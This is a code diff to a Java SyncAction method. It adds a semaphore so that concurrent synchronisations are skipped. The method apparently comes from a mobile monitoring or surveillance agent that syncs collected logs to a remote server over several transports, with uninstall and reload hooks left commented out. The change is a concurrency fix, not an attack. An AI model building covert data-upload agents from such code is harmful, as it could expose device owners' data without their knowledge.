@@ -103,96 +103,109 @@ public abstract class SyncAction extends SubActionSlow {
 			return false;
 		}
 
-		// moduleManager.reload(AgentType.AGENT_DEVICE);
-		moduleManager.resetIncrementalLogs();
-
-		boolean ret = false;
-		
-		if (Cfg.DEMO) {
-			Beep.beep();
-			Status.self().makeToast(M.e("AGENT synchronization in progress"));
+		if(!status.semaphoreSync.tryAcquire()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "Syncing in action: skipping"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+			return false;
 		}
 
-		for (int i = 0; i < transports.size(); i++) {
-			final Transport transport = (Transport) transports.elementAt(i);
+		try {
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " execute transport: " + transport); //$NON-NLS-1$
+			// moduleManager.reload(AgentType.AGENT_DEVICE);
+			moduleManager.resetIncrementalLogs();
+
+			boolean ret = false;
+
+			if (Cfg.DEMO) {
+				Beep.beep();
+				Status.self().makeToast(M.e("AGENT synchronization in progress"));
 			}
 
-			if (Cfg.DEBUG) {
-				String instance = new String(Keys.self().getBuildId());
-				Check.log(TAG + " transport Sync url: " + transport.getUrl() + " instance: " + instance.substring(4)); //$NON-NLS-1$
-			}
+			for (int i = 0; i < transports.size(); i++) {
+				final Transport transport = (Transport) transports.elementAt(i);
 
-			if (transport.isAvailable() == false) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (execute): transport unavailable, enabling it..."); //$NON-NLS-1$
+					Check.log(TAG + " execute transport: " + transport); //$NON-NLS-1$
 				}
 
-				// enable() should manage internally the "forced" state
-				transport.enable();
-				// TODO: wait for the enabling.
-			}
-
-			// Now the transport should be available
-			if (transport.isAvailable() == true) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " execute: transport available"); //$NON-NLS-1$
+					String instance = new String(Keys.self().getBuildId());
+					Check.log(TAG + " transport Sync url: " + transport.getUrl() + " instance: " + instance.substring(4)); //$NON-NLS-1$
 				}
 
-				protocol.init(transport);
-
-				try {
-					Date before, after;
-
+				if (transport.isAvailable() == false) {
 					if (Cfg.DEBUG) {
-						before = new Date();
+						Check.log(TAG + " (execute): transport unavailable, enabling it..."); //$NON-NLS-1$
 					}
 
-					Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
-					ret = protocol.perform();
-					Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
-					// transport.close();
+					// enable() should manage internally the "forced" state
+					transport.enable();
+					// TODO: wait for the enabling.
+				}
 
+				// Now the transport should be available
+				if (transport.isAvailable() == true) {
 					if (Cfg.DEBUG) {
-						after = new Date();
-						final long elapsed = after.getTime() - before.getTime();
-						Check.log(TAG + " (execute): elapsed=" + elapsed / 1000); //$NON-NLS-1$ //$NON-NLS-2$
-					}
-				} catch (final Exception e) {
-					if (Cfg.EXCEPTION) {
-						Check.log(e);
+						Check.log(TAG + " execute: transport available"); //$NON-NLS-1$
 					}
 
+					protocol.init(transport);
+
+					try {
+						Date before, after;
+
+						if (Cfg.DEBUG) {
+							before = new Date();
+						}
+
+						Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
+						ret = protocol.perform();
+						Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
+						// transport.close();
+
+						if (Cfg.DEBUG) {
+							after = new Date();
+							final long elapsed = after.getTime() - before.getTime();
+							Check.log(TAG + " (execute): elapsed=" + elapsed / 1000); //$NON-NLS-1$ //$NON-NLS-2$
+						}
+					} catch (final Exception e) {
+						if (Cfg.EXCEPTION) {
+							Check.log(e);
+						}
+
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
+						}
+
+						ret = false;
+					}
+
+					// wantUninstall = protocol.uninstall;
+					// wantReload = protocol.reload;
+
+				} else {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
+						Check.log(TAG + " execute: transport not available"); //$NON-NLS-1$
+					}
+				}
+
+				if (ret) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " Info: SyncAction OK"); //$NON-NLS-1$
 					}
 
-					ret = false;
+					status.synced = true;
+					return true;
 				}
 
-				// wantUninstall = protocol.uninstall;
-				// wantReload = protocol.reload;
-
-			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " execute: transport not available"); //$NON-NLS-1$
+					Check.log(TAG + " Error: SyncAction Unable to perform"); //$NON-NLS-1$
 				}
 			}
 
-			if (ret) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Info: SyncAction OK"); //$NON-NLS-1$
-				}
-
-				status.synced = true;
-				return true;
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: SyncAction Unable to perform"); //$NON-NLS-1$
-			}
+		}finally{
+			status.semaphoreSync.release();
 		}
 
 		return false;
